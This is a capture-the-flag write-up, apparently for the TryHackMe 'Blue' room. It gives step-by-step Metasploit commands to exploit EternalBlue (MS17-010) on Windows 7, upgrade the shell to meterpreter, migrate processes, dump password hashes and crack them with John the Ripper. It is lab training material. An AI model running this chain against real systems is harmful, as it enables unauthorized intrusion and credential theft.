---
lineNumbers: True
---

# Blue

  

## Initial recon

  

First, scan the host

```sh
nmap -A -T5 <IP>
```

The main expoloitable service found was the `windows 7 professional 7601 Service pack 1`

Related to Eternalblue `MS17-010`

Now lets run the metasploit console

```sh
sudo service postgresql start
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
show targets
set TARGET 0
show options
set rhosts <IP>
exploit
```


Now we have a shell inside the windows machine. Let's look for the flag.


A flag was found inside the documents folder for a person named `Jon`


```sh
C:\Users\Jon\Documents
type flag3.txt
```


## Followup Recon

Let's upgrade the **shell** to a **meterpreter**.

First, background the current shell `CTRL + Z`

There are 2 ways to do this,

1.
    ```sh
    sessions
    # should list out sessions here
    sessions -u 1 # stands for upgrade session 1
    sessions 2 # connect to the new meterpreter session
    ```

2.
    ```sh
    use post/multi/manage/shell_to_meterpreter
    set session <shell_session_ID>
    exploit
    sessions <shell_session_ID>
    ```

Now lets see who I am

```sh
shell
whoami
```


looking at the processes running on the machine and migrating to it

```sh
ps
migrate <process_id>
```

  
Once migrating over to a new process, lets take a look at the hashes

```sh
hashdump
```

Now lets crack them, first background the meterpreter


```sh
use post/windows/gather/hashdump
set session <session_id>
run
```

Lets check what creds looks like
```sh
creds # make sure it outputs the hashdump that it found
```

![image](/images/ctf/tryhackme/blue/creds_example.PNG)

```sh
use auxiliary/analyze/jtr_windows_fast
run
```

submit the flags and now we are done!